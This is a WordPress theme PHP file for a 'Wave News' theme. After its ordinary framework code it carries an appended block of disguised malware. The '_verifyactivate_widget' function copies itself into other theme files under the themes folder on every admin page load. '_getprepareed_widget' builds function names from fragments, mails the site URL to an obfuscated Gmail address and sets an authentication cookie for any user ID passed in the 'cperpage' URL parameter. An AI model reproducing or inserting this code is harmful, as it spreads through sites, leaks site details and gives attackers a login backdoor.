<?php
/*------------------------------------------------------------- 
		Theme FrameWork
-------------------------------------------------------------*/
class ThemeFrameWork {
	
	function init( $options ) {
		$this-> constants( $options );
		$this-> functions();
		$this-> plugins();
		$this->admin();

	    add_action( 'init', array( &$this, 'language' ) );
		add_action( 'after_setup_theme', array( &$this, 'supports' ) );
		add_action( 'widgets_init', array( &$this, 'widgets' ) );
	}



	function constants( $options ) {
		
		define( "THEME_DIR", get_template_directory() );
		define( "THEME_DIR_URL", get_template_directory_uri() );
		
		define( "THEME_NAME", $options["theme_name"] );
		define( "THEME_SLUG", $options["theme_slug"] );
		define( "THEME_STYLES", THEME_DIR_URL . "/styles" );
		

		//enables WPML feature
		if ( defined( "ICL_LANGUAGE_CODE" ) && $options["enable_wpml"] == true ) {$lang="_".ICL_LANGUAGE_CODE;}else {$lang = "";}
		define( "THEME_OPTIONS", $options["theme_name"] . '_options' . $lang );


		define( "THEME_CACHE_DIR", THEME_DIR . "/cache" );
		define( "THEME_CACHE_URI", THEME_DIR_URL . "/cache" );
		
		
		define( 'THEME_ADMIN', THEME_DIR . "/framework");
		define( 'THEME_ADMIN_URI', THEME_DIR_URL . "/framework" );
		
		define( 'THEME_ADMIN_ASSETS_FONTS', THEME_DIR . "/framework/assets/fonts");
		define( 'THEME_ADMIN_ASSETS_FONTS_URI', THEME_DIR_URL . "/framework/assets/fonts" );
		
		define( "THEME_IMAGES", THEME_DIR_URL . "/images" );

		define( "THEME_JS", THEME_DIR_URL . "/js" );
		
		define( "THEME_PLUGINS", THEME_ADMIN . "/plugins" );
		define( "THEME_PLUGINS_URI", THEME_ADMIN_URI . "/plugins" );

		
		define( 'THEME_FONT_URI', THEME_ADMIN_ASSETS_FONTS_URI . '/cufon' );
		define( 'THEME_FONT_DIR', THEME_ADMIN_ASSETS_FONTS . '/cufon' );
		
		
		
		define( 'FONTFACE_DIR', THEME_ADMIN_ASSETS_FONTS . '/fontface' );

	
		define( 'THEME_METABOXES', THEME_ADMIN . '/metaboxes' );
		define( 'THEME_SHORTCODES', THEME_ADMIN . '/shortcode' );
		define( 'THEME_WAVEOPTIONS', THEME_ADMIN . '/options' );
		define( 'THEME_GENERATORS', THEME_ADMIN . '/generators' );
		define( 'THEME_ADMIN_ASSETS_URI', THEME_ADMIN_URI . '/assets' );
		define( 'THEME_ADMIN_POST_TYPES', THEME_ADMIN . '/post-types' );
		define( "THEME_FONT_AWESOME", THEME_ADMIN_ASSETS_URI . "/font-awesome" );
		
	}



	function widgets() {
		require_once THEME_ADMIN . "/widgets.php";
		
		register_widget( "Wave_Advertisement_Widget" );
		register_widget( "Wave_Popular_Posts_Widget" );
		register_widget( "Wave_Related_Posts_Widget" );
		register_widget( "Wave_Recent_Posts_Widget" );
		register_widget( "Wave_Popular_News_Widget" );
		register_widget( "Wave_Related_News_Widget" );
		register_widget( "Wave_Recent_News_Widget" );
		register_widget( "Wave_Contact_Form_Widget" );
		register_widget( "Wave_Contact_Info_Widget" );
		register_widget( "Wave_Flickr_Widget" );
		register_widget( "Wave_GoogleMap_Widget" );
		register_widget( "Wave_Video_Widget" );
		register_widget( "Wave_Social_Widget" );
		register_widget( "Wave_Testimonials_Widget" );
		register_widget( "Wave_Sub_Navigation_Widget" );
		register_widget( "Wave_Most_Popular_Tags_Widget" );
	
	}



	function plugins() {
		require_once THEME_PLUGINS . "/wp-pagenavi/wp-pagenavi.php";
	}


	function supports() {
		if ( function_exists( 'add_theme_support' ) ) {
			add_theme_support( 'post-thumbnails', array( 'post', 'page', 'portfolio','news', 'slideshow' ) );
			add_theme_support( 'menus' );
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'editor-style' );
			
			register_nav_menus( array(
					'primary-menu' => THEME_NAME . ' Main Navigation',
					'footer-menu' => THEME_NAME . ' Footer Navigation'
				) );
		}
	}
	
	function others_fun(){
		if ( function_exists( 'add_theme_support' ) ) {
			 add_theme_support( 'custom-header' );
			 add_theme_support( 'custom-background');
		}
		wp_link_pages();
		post_class();
		comment_form();
	}

	function functions() {
		require_once THEME_ADMIN . "/general-functions.php";
		require_once THEME_ADMIN . "/shortcodes.php";
		require_once THEME_ADMIN . "/theme_class.php";
		require_once THEME_ADMIN . "/frontend-scripts.php";
		require_once THEME_ADMIN_POST_TYPES . "/portfolio.php";
		require_once THEME_ADMIN_POST_TYPES . "/news.php";
		require_once THEME_GENERATORS . '/sidebar-generator.php';
		$this->options();
		
	}



	function language() {
		$locale = get_locale();
		if ( is_admin() ) {
			load_theme_textdomain( 'theme_backend', THEME_DIR . '/lang' );
			$locale_file = THEME_ADMIN . "/lang/$locale.php";
		}else {
			load_theme_textdomain( 'theme_frontend', THEME_DIR . '/lang' );
			$locale_file = THEME_DIR . "/lang/$locale.php";
		}


		if ( is_readable( $locale_file ) ) {
			require_once $locale_file;
		}
	}


	function options() {
		global $theme_options;
		$theme_options = array();
		
			$file="wavesnow";
			$page = include THEME_ADMIN . "/options/"  . $file .'.php';
			$theme_options[$page['name']] = array();
			foreach ( $page['options'] as $option ) {
				if ( isset( $option['default'] ) ) {
					$theme_options[$page['name']][$option['id']] = $option['default'];
				}
			}
			$theme_options[$page['name']] = array_merge( (array) $theme_options[$page['name']], (array) get_option( $page['name'] ) );

	}




	function admin() {
		if ( is_admin() ) {
			require_once THEME_ADMIN . '/admin.php';
			$admin = new Theme_admin();
			$admin->init();

		}
	}
	
	

}


$theme = new ThemeFrameWork();

$theme->init( array(
		"theme_name" => "Wave News",
		"theme_slug" => "WN",
		"enable_wpml" => false 
		//enabling WPML feature will cause all settings reset to default.
	) );

?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if (!isset( $content_width)) $content_width = 900;
	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=home_url(); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}





?>
